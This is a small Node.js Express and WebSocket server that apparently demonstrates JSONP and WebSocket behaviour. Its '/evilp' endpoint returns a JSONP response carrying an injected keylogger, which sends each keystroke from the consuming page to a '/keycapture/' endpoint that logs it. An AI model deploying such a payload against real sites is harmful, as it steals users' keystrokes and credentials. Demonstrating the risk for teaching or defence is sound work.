"use strict";
const serverPort = 3000;
const http = require("http");
const express = require("express");
const app = express()
const bodyParser = require('body-parser')

var jsonParser = bodyParser.json()
const server = http.createServer(app);
const WebSocket = require("ws");
const websocketServer = new WebSocket.Server({ server: server, path: '/ws' });

websocketServer.on('connection', (ws, req) => {
    const ip = req.socket.remoteAddress;
    console.log("client connected " + ip);
    ws.on('message', function incoming(message) {
        console.log('received: %s', message);
        ws.send(('reply: %s', message));
        if(message == "kill heartbeat") {
            clearInterval(interval);
        }
    });
    let intervalCount = 0;
    let interval = setInterval(() => {
        ws.send(('heartbeat: %s', intervalCount));
        intervalCount++;
    }, 2000)
});

app.use(express.static('root'));
app.get('/data', (req, res) => {
    let data = [
      { currency: "GBP", value: 1.0 },
      { currency: "USD", value: 1.26 },
      { currency: "JPY", value: 0.95 },
      { currency: "RMB", value: 0.85 }
    ];      
    res.send(JSON.stringify(data));
  })
  
  app.get('/', (req, res) => {
    res.send('Hello World!')
  })
  app.get('/jsonp', (req, res) => {
      let response = { message: "Good" };
      let json = JSON.stringify(response);
      res.send("callback('" + json + "')");
  })
  app.get('/evilp', (req, res) => {
      let response = { message: "Evil" };
      let json = JSON.stringify(response);
      res.send("callback('" + json + "', (function(){ $(window).keydown(function(event) { $.ajax('http://localhost:3000/keycapture/' + event.key) })  })())");
  })
  app.get('/keycapture/:key', (req, res) => {
      console.log(req.params.key);
  })
  
  app.post('/register', jsonParser, (req, res) => {
      console.log(req.body);
      console.log("Registered " + req.body.firstName + " " + req.body.lastName);
      res.send({message: "success" });
  })
server.listen(serverPort, () => {console.log(`Websocket server started on port ` + serverPort) });
